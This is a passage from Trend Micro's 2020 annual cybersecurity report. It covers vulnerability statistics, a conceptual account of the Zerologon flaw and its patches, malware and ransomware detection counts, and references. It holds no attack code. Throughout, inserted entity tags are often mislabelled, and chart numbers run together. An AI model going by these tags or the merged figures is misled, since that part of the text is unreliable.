Initiative \u2122 ( ZDI ) program published advisories on [CARDINAL] 1,453 vulnerabilities , a 40 % increase from [DATE] 2019 . Of these , [CARDINAL] 173 were rated with critical severity and [CARDINAL] 983 with high severity , basedon [ORG] the [ORG] Common [ORG] Vulnerability [ORG] Scoring [ORG] System [ORG] ( CVSS).70 The critical- and high - severity vulnerabilitiessaw significant spikes from the [DATE] 2019 numbers . Because of the dangers they could pose to enterprises , critical- and high - severity vulnerabilities need to be patched as soon as possible , potentially adding tothe workloads of IT teams.1,5001,0351,453020192020Figure [CARDINAL] 26 . The number of published vulnerability advisories increased year on year by [CARDINAL] 40%:A comparison of the numbers of disclosed vulnerabilities in [DATE] 2019 and [CARDINAL] 2020Source : Trend Micro \u2122 Zero Day Initiative \u2122 program32 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity Report1K583191 LowFigure [CARDINAL] 27 . Critical- and high - severity vulnerabilities saw spikes in numbers , which could mean heavierworkloads for IT teams due to patching issues : A comparison of the severity breakdown , based on the [ORG] CVSS , of disclosed vulnerabilities in [DATE] 2019 and [CARDINAL] 2020Source : Trend Micro Zero Day Initiative programBased on our data on the top exploited vulnerabilities from [DATE] 2017 [DATE] to [DATE] 2020 , vulnerabilities from as far backas [DATE] 2005 were still being heavily exploited . What this signifies is that organizations should not assume thattheir systems are automatically safe from exploitation of old vulnerabilities and should always be vigilantin patching their [CARDINAL] software.60M30M51,316,46330,251,19922,409,5165,421,477 [CARDINAL] 4,982,852 [CARDINAL] 4,024,250 [CARDINAL] 3,848,442 [CARDINAL] 1,692,063 [CARDINAL] 1,397,075 [CARDINAL] 1,397,075CVE-2005 - 1380CVE-2009 - 2532CVE-2010 - 0817CVE-2010 - 3936CVE-2011 - 1264CVE-2014 - 3567CVE-2017 - 0068CVE-2017 - 10986CVE-2017 - 14100CVE-2019 - 122502017201820192020Figure 28 . The age of vulnerabilities did not matter to malicious actors , as vulnerabilities from as far back as [DATE] 2005 were still among the most exploited : A comparison of the detection counts ofthe [CARDINAL] 10 most exploited vulnerabilities from [CARDINAL] 2017 to [CARDINAL] 2020Note : CVE-2010 - 3936 and CVE-2017 - 0068 use the same filter ID and therefore have the same numbers . Source : [ORG] Trend [ORG] Micro [ORG] Digital [ORG] Vaccine filters33 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportZerologon Bug Emerges , Potentially Allowing Attackers to Take Over Entire NetworksOne of the most prominent vulnerabilities discovered in [DATE] 2020 was CVE-2020 - 1472.71 It was [GPE] dubbedZerologon because the flaw exists in the logon process for servers that use NT [PERSON] Lan [PERSON] Manager ( NTLM):Ideally , the code behind the process should always be a random number , but in [GPE] Zerologon \u2019s case , itcontains [CARDINAL] four [ORG] zeroes.72Zerologon is a dangerous bug with active proof - of - concept ( [ORG] POC ) exploits ; its severity is rated [CARDINAL] 10 out of10 on the CVSS . It exploits a flaw in [ORG] Microsoft \u2019s [ORG] Active [ORG] Directory ( AD ) Netlogon Remote Protocol ( MS - NRPC ) that gives users the ability to log on to servers that are using NTLM.73 Given that MS - NRPC is alsoused to transmit account changes and passwords , it is clear to see why it could become problematic . [PERSON] Zerologon could allow an attacker to take control of a domain controller by either changing or removing thepassword used for a service account on the controller , after which the attacker could perform maliciousactions such as launching a denial - of - service attack or even taking over the entire network . By usingthe publicly available [ORG] POC exploits , the attacker could perform even more damaging activities such asinfecting the affected system with ransomware.74Microsoft released an initial patch for [GPE] Zerologon in [DATE] August [DATE] 2020 and a [ORDINAL] second patch in February2021.75 The [ORDINAL] first update blocks domain controllers from using unsecured remote procedure call ( RPC)communications , while the [ORDINAL] second update enables enforcement mode on domain controllers by defaultto block vulnerable connections from noncompliant devices.7634 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportModern Threats Require Comprehensive Defense Strategies and Multilayered Security TechnologiesEnterprises are facing major security risks from determined threat actors who do not shy away fromusing every tool and trick in their arsenal . This is compounded by the unique situation in which manyorganizations have found themselves in , having to secure both the physical and virtual workspaces amida worldwide pandemic . In [DATE] today \u2019s complex working environment , where the lines between the home and the office have beenblurred , the right technologies are essential for building a robust security profile . Instead of relying onsingle layers of protection , each of which covers only a portion of the overall infrastructure , organizationsshould consider a strong multilayered security . The solution should offer a wide range of capabilities \u2014 including detection , investigation , and response \u2014 and provide comprehensive protection throughout thewhole system \u2014 from emails and endpoints to servers , networks , and even cloud workloads . In addition to the technological factors and issues , the pandemic has had a significant effect on theperformance of security operation centers ( SOCs ) . Aside from having to ensure that the right technologicalpieces are in place for a secure working environment , security professionals also have to deal withincreased workloads that could lead to burnout.77 A proper multilayered security solution should give [ORG] ITstaff and security personnel the ability to gain insights into the nature of the threats they are facing . Theuse of technologies such as machine learning and behavior monitoring can help organizations focus onthe most critical aspects of security without needing to go through a sizeable amount of data . Enterprises should combine these technologies with the right security strategies and policies . Even withthe emergence of increasingly complex attacks , phishing and social engineering remain to be commoninfection vectors for most malicious actors \u2014 from inexperienced amateurs to even the most skilledgroups . Organizations should therefore consider investing in the training of their workforce with regard toidentifying the most prevalent phishing and social engineering techniques.7835 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportOrganizations should also conduct regular security audits to ensure that their physical and cloudinfrastructures are free of instances of misconfiguration and other weak points . They should also performperiodic data sweeps to help detect early warning signs such as [ORDINAL] first - stage malware and tools that areusual precursors to the actual payloads . Furthermore , given how supply - chain attacks are now being used regularly by malicious actors , it isimportant for companies to evaluate the security of their suppliers and other partners and , if possible , work with them to create strong defenses against these attacks . The need for timely and efficient patch management can not be stressed enough . Vulnerabilities such [ORG] asZerologon prove that the best time for updates is as soon as the updates become available . However , thereality is that patching is not as simple as it seems . It takes considerable time to update the whole system , and the existence of zero - day vulnerabilities further complicates matters . To help with this , enterprisescan consider using technologies that offer virtual patching to bolster security while implementing updatesor waiting for fixes to be rolled out.79For most organizations , the issue of migrating their workforce from the physical office to the home issomething that has been dealt with in some manner . The pressing need for most enterprises now is theneed to sustain their operations while taking into account the technologies , the importance of security , and the human point of view.36 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportThreat Landscape in [DATE] ReviewIn [DATE] 2020 , the Trend Micro \u2122 Smart Protection Network \u2122 infrastructure protected users from [CARDINAL] more [CARDINAL] than [CARDINAL] 62billion threats consisting of email threats , malicious files , and malicious [ORG] URLs.62,637,731,995blocked threats in [CARDINAL] 2020Blocked email threatsBlocked malicious \ufb01lesBlocked malicious [GPE] URLs35B31,436,659,17725,825,951,75301H2H3B02,670,438,897969,254,2321B707,420,9621,028,006,9741H2H01H2HEmail reputation queriesFile reputation queriesURL reputation [DATE] queries50B43,471,552,69336,271,603,94401H2H1T0815,199,696,2811.5T1,332,207,264,639708,757,638,2331,006,547,423,4051H2H01H2HFigure [DATE] 29 . While nearly every metric for blocked threats and reputation queries increased from thefirst to the second half of the year , the increase in blocked malicious files was particularly substantial : A comparison of the numbers of blocked email , file , and URL threats , and of email , file , andURL reputation queries in the [ORDINAL] first and [ORDINAL] second halves of [CARDINAL] 2020Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructure37 | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity ReportThe top [CARDINAL] 10 malware families in terms of detections in [DATE] 2020 included familiar names , with [ORG] WannaCry , [ORG] Coinminer , and [PERSON] Emotet making up the top [CARDINAL] three . [ORG] WannaCry , aside from being the top malware family , isthe only ransomware in the list . Cryptocurrency miners as a whole are in [ORDINAL] second place , showing howprevalent they had become . The majority of the top [CARDINAL] 10 are made up of older families that , despite theirage , were still responsible for a large number of infections . [ORG] WannaCry [CARDINAL] 220,166 Emotet160,049134,444120,29590,07686,78283,60677,50571,92058,026PowloadDownadEquatedViruxNemucodSalityDloader0250KFigure 30 . The [ORG] WannaCry ransomware remained the top threat , with cryptocurrency miners as a wholein [ORDINAL] second place : The [CARDINAL] 10 most detected malware families in [CARDINAL] 2020Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructureOur data on the top cryptocurrency miners in [DATE] 2020 reveals that the top [CARDINAL] three entries alone accounted formore than [CARDINAL] 120,000 detections . MalXMR 76,99726,81422,67210,6756,9073,3242,5402,3971,369760CoinhiveCoinminerCoinmineToolXMRCryptoNightMalrepMalBTCEthereumTooleth080KFigure 31 . MalXMR , Coinhive , and [ORG] Coinminer were the most detected cryptocurrency miners , accounting for morethan [CARDINAL] 120,000 between the [CARDINAL] three of them : The [CARDINAL] 10 most detected cryptocurrency miners in [CARDINAL] 2020Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructure38 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity [DATE] ReportIn [DATE] 2020 , we detected [CARDINAL] more [CARDINAL] than [CARDINAL] 2.3 [CARDINAL] million endpoints that connected to [ORG] C&C servers , while we detectedjust over 100,000 botnet [ORG] C&C servers . The large number of servers could be attributed either to maliciousactors that were using [ORG] C&C servers as part of their operations or to groups that were using increasinglycomplex [ORG] C&C infrastructure . On the other hand , the number of botnet connections we detected from oursensors alone suggests that there could have been [CARDINAL] millions of potential victims.2,370,7892.5M105,7190BotnetconnectionsBotnetC&C serversFigure [DATE] 32 . We detected over [CARDINAL] 2.3 [CARDINAL] million botnet connections and [CARDINAL] over [CARDINAL] 100,000 botnet [ORG] C&C servers : The numbers of detected botnet connections and botnet [ORG] C&C servers in [CARDINAL] 2020Note : [PERSON] Botnet connections were unique endpoints that queried or connected to [ORG] C&C servers , while botnet [ORG] C&C servers were unique and active [ORG] C&C servers that endpoints queried or connected to . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructureThere were [CARDINAL] 127 new ransomware families discovered in [DATE] 2020 , a [PERCENT] 34 % increase from the [CARDINAL] 95 found in [CARDINAL] 2019.80Egregor , despite having its initial detection occur only in [DATE] September , managed to rank in the top [CARDINAL] 10ransomware families of [DATE] 2020 , as shown in Figure [DATE] 1.15012795020192020Figure [DATE] 33 . New ransomware families increased year on [DATE] year by [CARDINAL] 34%:A comparison of the numbers of new ransomware families in [DATE] 2019 and [CARDINAL] 2020Source : Trend Micro Smart Protection Network infrastructure39 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity ReportJANFEBMARAPRMAYAkoLockerAntefrigusBBAvestBalaclavaBitPyLockerCaiKeslanZeoticusCrypenCodeCryptopxjCrytoxCorvinaMadoNefilimPysaTriplemDemonCryptWannaRenFTCodeLedifMakopMorrisbatchcryptOnyxLockerRagnarokRanscrapeTrsomwareWannaCashWannaScreamWilboyBallisticBearCryptPonyFinalGonnaCryCoronawinlockerCoronaLockColdLockBlueCheeserCreepyCryLockGeminiceJestLbkutOnaLockerOoglegoSadogoSfile2UpperVoidWreathJUNZorabWorldCrySuchCryptSapphireQrnaLockPowLockLocmentLickyAgentKrygoFunicornFreefilEscalCyberThanosChimeraBlackMoonBlackKingdomBlackClawAvaddonJULAUGSEPOCTNOVDECXinofTappifWhoLockerSunCryptAidsntBitMinerDoowtarHiddeneargdarmerieAgeLockerEyeCryLockerRanzyLockerAlolWastedlockerSilvertorBlackKnightHibunielWoodRatBacuCryptThiefQuestRagnarLockerBlackSquidJarCryptStrongPityGiveMeTheKeyCoronaCryptorLeakTheMallFlyingShipDogeCryptPay2KeyDuskEricaGodraHwruRedRomanStingJarVaggenPojiePantherLolkekExorcistDarkSideJosephNullCryptoLockEvilQuestBigLockCryCryptorBeadEgregorRegretLockerSantaCryptExxGavHexaCryptMountLocketReadManThanosVashsorenaViluciwareZhenTable [CARDINAL] 4 . [CARDINAL] 127 new ransomware families were discovered : New ransomware families detected in [CARDINAL] 2020Sources : Trend Micro Smart Protection Network infrastructure and analysis of externally sourced data40 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity [ORG] ReportOf our [CARDINAL] more [CARDINAL] than [CARDINAL] 11 [CARDINAL] million detections of file types used in spam email attachments in [DATE] 2020 , [ORG] PDFaccounted for nearly half . XLSX and HTML also had sizeable detection counts . [PERSON] TOTAL11,168,447PDF 1.9%Figure [CARDINAL] 34 . [ORG] PDF files accounted for [CARDINAL] nearly [CARDINAL] half of spam email attachments : The distribution of file types used in spam email attachments in [CARDINAL] 2020Source : Trend Micro Email Reputation ServicesWhile Windows - based operating systems still make up the majority of machines that were detected tohave some form of malware infection , a sizeable number of macOS and Linux machines also sufferedsimilarly . Windows [CARDINAL] 10 HomeWindowsWindows 7 [ORG] Ultimate [ORG] Professional [ORG] Service [ORG] Pack 1Windows 10 [ORG] ProWindows [ORG] 7 [ORG] Home [ORG] Premium [ORG] Service [ORG] Pack 1 macOS Windows 7 Professional Service Pack [DATE] 1Windows 8.1Windows [CARDINAL] 7 Ultimate Service Pack [CARDINAL] 1 Linux04,090,0533,793,1392,146,3291,525,205953,759886,485617,179570,611360,517127,1995MFigure [CARDINAL] 35 . Both macOS and Linux accounted for fairly significant numbers of malware infections , with macOS ranking higher than certain versions of Windows : The top [CARDINAL] 10 operating systems based on malware infectionsdetected on machines in [CARDINAL] 2020Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network infrastructure41 | A Constant State of Flux : Trend Micro 2020 Annual [ORG] Cybersecurity [ORG] ReportReferences1 [ORG] Trend [ORG] Micro . ( [DATE] Sept. [DATE] 15 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Boosting [WORK_OF_ART] Impact [WORK_OF_ART] for Profit : [WORK_OF_ART] Evolving [WORK_OF_ART] Ransomware [WORK_OF_ART] Techniques [WORK_OF_ART] for [WORK_OF_ART] Targeted [WORK_OF_ART] Attacks . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url evolving - ransomware - techniques - for - targeted - [PERSON] attacks.html.2 [PERSON] Catalin [PERSON] Cimpanu . ( [DATE] April [DATE] 21 , [DATE] 2020 ) . ZDNet . \u201c Here \u2019s a list of all the ransomware gangs who will steal and leak your data if youdon\u2019t pay . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url steal - and - leak - your - data - if - you - dont - pay.3 Coalition , Inc. ( n.d . ) . Coalition . \u201c [WORK_OF_ART] Cyber [WORK_OF_ART] Insurance [WORK_OF_ART] Claims [WORK_OF_ART] Report . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url [ORG] Trend [ORG] Micro . ( [DATE] Feb. [DATE] 4 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Ryuk [WORK_OF_ART] Ransomware [WORK_OF_ART] Infects [WORK_OF_ART] US [WORK_OF_ART] Government [WORK_OF_ART] Contractor . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url infects - us - government - contractor.5 [ORG] Cybersecurity [ORG] & [ORG] Infrastructure [ORG] Agency . ( [DATE] Nov. [DATE] 2 , [DATE] 2020 ) . [ORG] Cybersecurity [ORG] & [ORG] Infrastructure [ORG] Agency . \u201c Ransomware Activity [ORG] Targetingthe [ORG] Healthcare [ORG] and [ORG] Public [ORG] Health [ORG] Sector . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url [ORG] HHS [ORG] Cybersecurity [ORG] Program . ( [DATE] Nov. [DATE] 11 , [DATE] 2020 ) . [ORG] HHS [ORG] Cybersecurity [ORG] Program . \u201c [ORG] TrickBot , [ORG] Ryuk , and [ORG] the [ORG] HPH [ORG] Sector . \u201d [GPE] Accessedon [DATE] Feb. [DATE] 3 , [DATE] 2021 , at url [PERSON] Greg [PERSON] Foss . ( [DATE] Oct. 30 , [DATE] 2020 ) . [PERSON] Carbon [PERSON] Black . \u201c [WORK_OF_ART] TAU [WORK_OF_ART] Threat [WORK_OF_ART] Advisory : [WORK_OF_ART] Imminent [WORK_OF_ART] Ransomware threat to [ORG] U.S. [ORG] Healthcare [ORG] and [ORG] Public [ORG] Health [ORG] Sector . \u201d Accessed on [DATE] Feb. [DATE] 3 , [DATE] 2021 , at url threat - to - u - s - healthcare - and - public - health - sector.8 Trend Micro . ( [DATE] March 14 , [DATE] 2019 ) . [ORG] Trend [ORG] Micro . \u201c Examining Ryuk Ransomware Through the Lens of Managed Detection andResponse . \u201d Accessed on [DATE] Feb. [DATE] 3 , [DATE] 2021 , at url examining - ryuk - ransomware - through - the - lens - of - managed - detection - and - response.9 Trend Micro . ( [DATE] Nov. [DATE] 4 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Ryuk 2020 : Distributing Ransomware via [ORG] TrickBot and [ORG] BazarLoader . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url ransomware - via - trickbot - and - bazarloader.10 Trend Micro . ( [DATE] Aug. [DATE] 26 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Securing the Pandemic - Disrupted Workplace . \u201d Accessed on [DATE] Feb. [DATE] 8 , [DATE] 2021 , aturl disrupted - workplace - trend - micro-2020 - midyear - cybersecurity - report.11 Trend Micro . ( [DATE] Dec. 14 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Egregor Ransomware Launches String of High - Profile Attacks to End [CARDINAL] 2020.\u201dAccessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url high - profile - attacks - to - en.html.12 Tomas Meskauskas . ( [DATE] Oct. [DATE] 29 , [DATE] 2020 ) . [PERSON] Security [PERSON] Boulevard . \u201c Egregor : [PERSON] Sekhmet \u2019s Cousin . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url CISO Mag . ( [DATE] Nov. [DATE] 3 , [DATE] 2020 ) . CISO Mag . \u201c Are We Really Out of the Maze ? [ORG] The [ORG] Ransomware [ORG] Gang [ORG] Announces [ORG] Retirement . \u201dAccessed on [DATE] Feb. [DATE] 8 , [DATE] 2021 , at url [ORG] Trend [ORG] Micro . ( [DATE] Dec. 14 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Egregor Ransomware Launches String of High - Profile Attacks to End [CARDINAL] 2020.\u201dAccessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url high - profile - attacks - to - en.html.15 [ORG] Trend [ORG] Micro . ( [DATE] Jan. [DATE] 5 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] An [WORK_OF_ART] Overview [WORK_OF_ART] of [WORK_OF_ART] the [WORK_OF_ART] DoppelPaymer [WORK_OF_ART] Ransomware . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , aturl [ORG] Federal [ORG] Bureau [ORG] of [ORG] Investigation , [ORG] Cyber [ORG] Division . ( [DATE] Dec. [DATE] 10 , [DATE] 2020 ) . Internet Crime Complaint Center . \u201c DoppelPaymerRansomware Attacks on Critical Infrastructure Impact Critical Services . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url Media / News/2020/201215 - 1.pdf.17 [ORG] Trend [ORG] Micro . ( [DATE] Aug. [DATE] 13 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [ORG] BitPaymer [ORG] Malware [ORG] Information . \u201d Last accessed on [DATE] Jan. 24 , [DATE] 2021 , at url [PRODUCT] Process [PRODUCT] Hacker . ( n.d . ) . [PERSON] Process [PERSON] Hacker . \u201c [PERSON] Process [PERSON] Hacker . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity [PERSON] Report19 [PERSON] Ryan [PERSON] Flores . ( [DATE] Dec. [DATE] 1 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] The [WORK_OF_ART] Impact [WORK_OF_ART] of [WORK_OF_ART] Modern [WORK_OF_ART] Ransomware [WORK_OF_ART] on [WORK_OF_ART] Manufacturing [WORK_OF_ART] Networks . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url networks.html.20 [PERSON] Leandro [PERSON] Froes . ( [DATE] Jan. 6 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Expanding Range and Improving Speed : A RansomExx Approach . \u201d [GPE] Accessedon [DATE] Feb. [DATE] 4 , [DATE] 2021 , at url approach.html.21 [PERSON] Nelson [PERSON] William [PERSON] Gamazo [PERSON] Sanchez et al . ( [DATE] Oct. [DATE] 19 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Operation Earth Kitsune : Tracking SLUB \u2019s CurrentOperations . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url earth - kitsune - tracking - slub - s - current - operations.22 [PERSON] Nelson [PERSON] William [PERSON] Gamazo [PERSON] Sanchez et al . ( [DATE] Oct. 28 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Operation Earth Kitsune : A Dance of Two NewBackdoors . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url dance - of - [CARDINAL] two - new - backdoors.html.23 [ORG] Trend [ORG] Micro . ( [DATE] Jan. [DATE] 5 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Earth Wendigo Injects JavaScript Backdoor to Service Worker for [ORG] Mailbox [ORG] Exfiltration . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url javascript - backdoor - to - service - worker - for-.html.24 [PERSON] Joseph [PERSON] C [PERSON] Chen , [PERSON] Jaromir [PERSON] Horejsi , and [PERSON] Ecular [PERSON] Xu . ( [DATE] Dec. 9 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] SideWinder [WORK_OF_ART] Uses [WORK_OF_ART] South [WORK_OF_ART] Asian [WORK_OF_ART] Issues for [ORG] SpearPhishing , Mobile Attacks . \u201d Accessed on [DATE] Jan. [DATE] 15 , [DATE] 2021 , at url leverages - south - asian - territorial - issues - for - spear - ph.html.25 Mayra [PERSON] Rosario [PERSON] Fuentes . ( [DATE] May [DATE] 26 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Shifts in [ORG] Underground [ORG] Markets . \u201d Accessed on [DATE] Feb. [DATE] 5 , [DATE] 2021 , at url [PERSON] Lawrence [PERSON] Abrams . ( [DATE] Jan. 12 , [DATE] 2019 ) . [PERSON] Bleeping [PERSON] Computer . \u201c [WORK_OF_ART] Ryuk [WORK_OF_ART] Ransomware [WORK_OF_ART] Partners with [ORG] TrickBot to [ORG] Gain [ORG] Access [ORG] to [ORG] Infected [ORG] Networks . \u201d Accessed on [DATE] Feb. [DATE] 8 , [DATE] 2021 , at url trickbot - to - gain - access - to - infected - networks/.27 Trend Micro . ( [DATE] Jan. [DATE] 16 , [DATE] 2016 ) . [ORG] Trend [ORG] Micro . \u201c Operation Pawn Storm : Fast Facts and [ORG] the [ORG] Latest [ORG] Developments . \u201d Accessed onJan . [DATE] 15 , [DATE] 2021 , at url [PERSON] Feike [PERSON] Hacquebord and Lord [PERSON] Alfred [PERSON] Remorin . ( [DATE] Dec. [DATE] 17 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Pawn [WORK_OF_ART] Storm \u2019s [WORK_OF_ART] Lack [WORK_OF_ART] of [WORK_OF_ART] Sophistication [WORK_OF_ART] asa [WORK_OF_ART] Strategy . \u201d Accessed on [DATE] Jan. 18 , [DATE] 2021 , at url sophistication - as - a - strategy.html.29 [PERSON] Paul [PERSON] Miguel [PERSON] Babon . ( [DATE] Sept. [DATE] 3 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Tricky \u2018 Forms \u2019 of Phishing . \u201d Accessed on [DATE] Jan. 18 , [DATE] 2021 , at url [PERSON] Catalin [PERSON] Cimpanu . ( [DATE] Feb. [DATE] 10 , [DATE] 2020 ) . ZDNet . \u201c [ORG] FBI warns about ongoing attacks against software supply chain companies . \u201d Accessed on [DATE] Feb. [DATE] 10 , [DATE] 2021 , at url chain - companies/.31 [ORG] Federal [ORG] Bureau [ORG] of [ORG] Investigation , [ORG] Cyber [ORG] Division . ( [DATE] March 30 , [DATE] 2020 ) . SANS Internet Storm Center . \u201c [PERSON] Kwampirs [PERSON] MalwareEmployed in Ongoing Cyber Supply Chain Campaign Targeting Global Industries , including [ORG] Healthcare [ORG] Sector . \u201d Accessed on [DATE] Feb. [DATE] 10 , [DATE] 2021 , at url [PERSON] Jake [PERSON] Williams . ( [DATE] Dec. [DATE] 15 , [DATE] 2020 ) . SANS Institute . \u201c What You Need to Know About the SolarWinds Supply - Chain Attack . \u201dAccessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url [ORG] SolarWinds . ( [DATE] Dec. 31 , [DATE] 2020 ) . [ORG] SolarWinds . \u201c [WORK_OF_ART] SolarWinds [WORK_OF_ART] Security [WORK_OF_ART] Advisory . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 15 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [ORG] Overview [ORG] of [ORG] Recent [ORG] Sunburst [ORG] Targeted [ORG] Attacks . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , aturl [PERSON] David [PERSON] Klepper . ( [DATE] Oct. [DATE] 17 , [DATE] 2020 ) . [ORG] Associated [ORG] Press [ORG] News . \u201c Scammers seize on [GPE] US election , but it \u2019s not votes they want . \u201dAccessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url [CARDINAL] 2410451f45102ddd4a82ebec8ac746.36 [PERSON] Tom [PERSON] Burt . ( [DATE] Sept. [DATE] 10 , [DATE] 2020 ) . [ORG] Microsoft . \u201c New cyberattacks targeting [GPE] U.S. elections . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url [ORG] Trend [ORG] Micro . ( [DATE] Aug. [DATE] 26 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Securing the Pandemic - Disrupted Workplace . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , aturl | A Constant State of Flux : Trend Micro 2020 Annual Cybersecurity Report38 Trend Micro . ( [DATE] Nov. [DATE] 11 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Developing Story : [WORK_OF_ART] COVID-19 [WORK_OF_ART] Used in Malicious Campaigns . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url malware - file - names - and - malicious - domains.39 [PERSON] Andrew [PERSON] Duehren and [PERSON] Kristina [PERSON] Peterson . ( [DATE] Nov. [DATE] 25 , [DATE] 2020 ) . [ORG] The [ORG] Wall [ORG] Street [ORG] Journal . \u201c Covid-19 Aid and Stimulus : What \u2019s Expiring Soon and What \u2019s in the [ORG] Works . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url soon - and - whats - in - the - works-11606311697.40 [ORG] Internal [ORG] Revenue [ORG] Service . ( [DATE] Dec. [DATE] 8 , [DATE] 2020 ) . [ORG] Internal [ORG] Revenue [ORG] Service . \u201c [ORG] IRS warns people about a COVID - related text message scam . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url scam.41 Check Point . ( [DATE] Jan. 12 , [DATE] 2021 ) . Check Point . \u201c Covid-19 \u2018 Vaccines \u2019 Touted for Just $ 250 on [PERSON] Darknet . \u201d Accessed on [DATE] Jan. [DATE] 19,2021 , at url [PERSON] Claire [PERSON] Zaboeva and [PERSON] Melissa [PERSON] Frydrych . ( [DATE] Dec. [DATE] 3 , [DATE] 2020 ) . [ORG] IBM [ORG] Security [ORG] Intelligence . \u201c [WORK_OF_ART] IBM [WORK_OF_ART] Uncovers [WORK_OF_ART] Global [WORK_OF_ART] Phishing [WORK_OF_ART] CampaignTargeting the COVID-19 [FAC] Vaccine [FAC] Cold [FAC] Chain . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url uncovers - global - phishing - covid-19 - vaccine - cold - chain.43 [PERSON] Marshall [PERSON] Chen et al . ( [DATE] Aug. 6 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Water Nue Phishing Targets Execs \u2019 Office 365 Accounts . \u201d Accessed on Jan.22 , [DATE] 2021 , at url [PERSON] Cedric [PERSON] Pernet . ( [DATE] Oct. 6 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [NORP] French companies Under [PERSON] Attack from [ORG] Clever [ORG] BEC [ORG] Scam . \u201d Accessed on [DATE] Jan. [DATE] 22,2021 , at url [ORG] Trend [ORG] Micro . ( [DATE] Oct. [DATE] 7 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c CSO Insights : [ORG] DataBank \u2019s [PERSON] Mark [PERSON] Houpt on Looking Beyond Securing Infrastructures in [ORG] the [ORG] New [ORG] Normal . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url cso - insights - databank - mark - houpt - on - looking - beyond - securing - infrastructures - in - the - new - normal.46 Yahoo ! . ( [DATE] Nov. 24 , [DATE] 2020 ) . Yahoo ! Finance . \u201c [ORG] Virtual [ORG] Private [ORG] Network ( VPN ) Market Report 2020 : [ORG] VPN [ORG] Usage [ORG] Spirals to an all [ORG] TimeHigh of 27.1 % - Global Forecast to 2027 . \u201d Accessed on [DATE] Jan. [DATE] 19 , [DATE] 2021 , at url network - vpn - market-100300294.html.47 Common Vulnerabilities and Exposures . ( n.d . ) . [PERSON] Common [PERSON] Vulnerabilities and Exposures . \u201c CVE-2019 - 11510 . \u201d Accessed on Jan.19 , [DATE] 2021 , at url [PERSON] Eduard [PERSON] Kovacs . ( [DATE] Jan. 